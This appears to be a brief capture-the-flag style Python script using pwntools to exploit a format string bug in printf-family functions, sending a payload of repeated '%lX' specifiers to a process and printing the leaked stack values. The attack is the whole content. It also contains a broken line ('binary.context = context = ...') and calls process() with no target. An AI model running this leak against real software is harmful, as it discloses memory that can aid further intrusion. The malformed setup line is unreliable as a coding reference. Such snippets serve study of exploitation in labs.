# printf family functions misused
# use %X to check, %lx

#%3$lX

from pwn import *

binary.context = context = './filename'

payload="%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX."

p = process()
p.recv()
p.sendline(payload)
print(p.recvall())
